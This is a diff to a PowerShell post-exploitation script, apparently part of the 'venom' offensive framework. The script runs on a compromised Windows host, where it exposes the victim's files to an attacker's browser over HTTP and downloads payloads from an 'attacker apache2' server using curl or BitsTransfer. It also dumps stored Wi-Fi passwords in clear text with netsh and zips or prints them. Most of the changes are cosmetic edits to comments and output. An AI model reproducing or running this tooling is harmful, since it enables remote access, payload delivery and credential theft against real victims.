@@ -30,8 +30,6 @@
    4º - In attacker PC access 'http://RHOST:8086/' (web browser) to read/browse/download files.
 
 .NOTES
-   Use 'CTRL+C' to stop webserver (local)
-
    cmd /c taskkill /F /IM Python.exe
    Kill remote Python process's (stop webserver|python)
 
@@ -104,18 +102,18 @@
    because after completing is task (terminate server) it exits.
 
 .EXAMPLE
-   PS C:\> .\webserver.ps1 -Download "192.168.1.73,ComptDefaults.ps1"
-   Downloads ComptDefaults.ps1 from apache2 (192.168.1.73) webroot
-   to @webserver remote working directory set in [< -SPath >]
-   This parameter can NOT be used together with other parameters
-   because after completing is task (Download file) it exits.
+   PS C:\> .\webserver.ps1 -Download "192.168.1.73,CompDefaults.ps1"
+   Downloads CompDefaults.ps1 from attacker apache2 (192.168.1.73)
+   webroot to @webserver remote working directory. This parameter can
+   NOT be used together with other parameters because after completing
+   is task (Download file) it exits.
 
 .INPUTS
    None. You cannot pipe objects into webserver.ps1
 
 .OUTPUTS
-   None. This cmdlet does not produce outputs (remote)
-   But if executed (local) it will produce terminal displays.
+   None. This cmdlet does not produce outputs if used -Windowstyle hidden
+   parameter, But if executed without it, it will produce terminal outputs.
 
 .LINK
     https://github.com/r00t-3xp10it/venom
@@ -169,8 +167,8 @@ Clear-Host;
 Write-Host $Banner;
 
 If($Download -ne "False"){write-host ""
-$ServerIP = $Download.split(',')[0] ## extract server ip addr from -Download URL string
-$FileName = $Download.split(',')[1] ## extract the filename from -Download URL string
+$ServerIP = $Download.split(',')[0] ## Extract server ip addr from -Download "string"
+$FileName = $Download.split(',')[1] ## Extract the filename from -Download "string"
 If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'False'){
    write-host "[warning] -Download parameter can not be used together with other parameters .." -ForeGroundColor Yellow
    Start-Sleep -Seconds 1
@@ -178,38 +176,45 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
 
    <#
    .SYNOPSIS
-      Downloads one file to remote-host (Curl|BitsTransfer)
+      Downloads one file from remote-host (Curl|BitsTransfer)
 
    .NOTES
-      File to Download must be stored in attacker apache2 webroot
+      File to Download must be stored in attacker apache2 webroot.
+      Double quotes are mandatory in this parameter value inputs.
 
    .EXAMPLE
-      PS C:\> .\webserver.ps1 -Download "192.168.1.73,ComptDefaults.ps1"
-      Downloads ComptDefaults.ps1 from apache2 (192.168.1.73) webroot
-      to @webserver remote working directory set in [< -SPath >]
+      PS C:\> .\webserver.ps1 -Download "192.168.1.73,CompDefaults.ps1"
+      Downloads CompDefaults.ps1 from attacker apache2 (192.168.1.73)
+      webroot to @webserver.ps1 remote working directory.
    #>
+
+   If($ServerIP -Match '127.0.0.1'){## Localhost connections not supported by this module
+      Write-Host "[abort] 127.0.0.1 (localhost) connections not supported" -ForeGroundColor Red -BackGroundColor Black
+      Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
+   }
 
    Write-Host "Downloading $FileName to $Initial_Path" -ForeGroundColor Green
    cmd /c curl -s http://$ServerIP/$FileName -o $FileName|Out-Null
-   If(-not($LASTEXITCODE -eq 0)){
+   If(-not($LASTEXITCODE -eq 0)){## Download using BitsTransfer service insted of curl.exe
       Write-Host "[fail] to download $FileName using curl.exe service" -ForeGroundColor Red -BackgroundColor Black
-      ## Download using BitsTransfer service insted of curl.exe
       Write-Host "Trying to download $FileName Using BitsTransfer (BITS)" -ForeGroundColor Yellow      
       Start-BitsTransfer -priority foreground -Source http://$ServerIP/$FileName -Destination $Initial_Path\$FileName -ErrorAction SilentlyContinue|Out-Null   
       If(-not($LASTEXITCODE -eq 0)){Write-Host "[fail] to download $FileName using BitsTransfer service" -ForeGroundColor Red -BackgroundColor Black;Start-Sleep -Seconds 1}
    }
 
    ## Make sure that file was successfuly downloaded
-   If(-not([System.IO.File]::Exists("$Initial_Path\$FileName")) -or $Download -eq $null){
+   If(-not([System.IO.File]::Exists("$Initial_Path\$FileName")) -or $FileName -ieq $Null){
       Write-Host "`nRemark : File to download must be stored in attacker apache2 webroot." -ForeGroundColor Yellow
       Write-Host "syntax : .\webserver.ps1 -Download `"<Apache2-IP>,<FileName.ps1>`"" -ForeGroundColor Yellow 
-      Write-Host "example: .\webserver.ps1 -Download `"192.168.1.73,FileName.ps1`"`n" -ForeGroundColor Yellow   
+      Write-Host "example: .\webserver.ps1 -Download `"192.168.1.73,FileName.ps1`"" -ForeGroundColor Yellow   
    }
-   Start-Sleep -Seconds 1 
+
+   ## Build Table Display
    If(Test-Path -Path "$Initial_Path\$FileName"){
       Get-ChildItem -Path "$Initial_Path\$FileName" -EA SilentlyContinue|Select-Object Directory,Name,Exists,CreationTime > $Env:LOCALAPPDATA\download.log
-      Get-Content -Path "$Env:LOCALAPPDATA\download.log";Remove-Item -Path "$Env:LOCALAPPDATA\download.log" -Force
+      Get-Content -Path "$Env:LOCALAPPDATA\download.log";Remove-Item "$Env:LOCALAPPDATA\download.log" -Force
    }
+   Write-Host "";Start-Sleep -Seconds 1 
    exit ## exit @webserver
 }
 
@@ -305,8 +310,8 @@ If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -o
          cmd /c tasklist /NH|findstr /I "python"
 
          ## Delete session PID Number from sessions.log file
-         $GrabPidIdentifier = Get-Content "$Env:TMP\sessions.log"|findstr /C:"$Sessions"
-         $SessionPidDeletion = $GrabPidIdentifier[0,1,2,3] -Join ''
+         # $GrabPidIdentifier = Get-Content "$Env:TMP\sessions.log"|findstr /C:"$Sessions"
+         # $SessionPidDeletion = $GrabPidIdentifier[0,1,2,3] -Join ''
          ((Get-Content -Path "$Env:TMP\sessions.log" -Raw|Select-String "$Sessions") -Replace "$Sessions","****")|Set-Content -Path "$Env:TMP\sessions.log" -NoNewLine -Force
       }Else{
          Write-Host "[fail] PID: $Sessions Not found" -ForeGroundColor Red -BackgroundColor Black
@@ -632,7 +637,6 @@ If(-not($Installation) -or $Installation -ieq $null){
          ## Build output Table
          Write-Host "Enumeration"
          write-host "-----------"
-         write-host "Architecture     : $env:PROCESSOR_ARCHITECTURE"
          write-host "Shell Privs      : $report"
          write-host "Remote Host      : $Remote_Host"
          Write-Host "LogonServer      : ${Env:USERDOMAIN}\\${Env:USERNAME}"
@@ -668,7 +672,7 @@ If(-not($Installation) -or $Installation -ieq $null){
          netsh wlan export profile folder=$Env:TMP\$DumpFolder key=clear|Out-Null
          Compress-Archive -Path "$Env:TMP\$DumpFolder" -DestinationPath "$Env:TMP\SSIDump.zip" -Force
          Write-Host "SSID Dump stored under: $Env:TMP\SSIDump.zip" -ForeGroundColor Yellow
-         Start-Sleep -Seconds 2;Remove-Item "$Env:TMP\$DumpFolder" -Recurse -Force|Out-Null
+         Start-Sleep -Seconds 1;Remove-Item "$Env:TMP\$DumpFolder" -Recurse -Force|Out-Null
       }Else{
          ## Dump SSID passwords into terminal prompt
          $profiles = netsh wlan show profiles|findstr /C:"All User Profile"
@@ -688,7 +692,7 @@ If(-not($Installation) -or $Installation -ieq $null){
          }
          ## Display Table
          $mytable|Format-Table -AutoSize > $Env:TMP\lk.log
-         Get-Content $Env:TMP\lk.log;Remove-Item $Env:TMP\lk.log -Force
+         Get-Content -Path "$Env:TMP\lk.log";Remove-Item "$Env:TMP\lk.log" -Force
       }
    }
 }
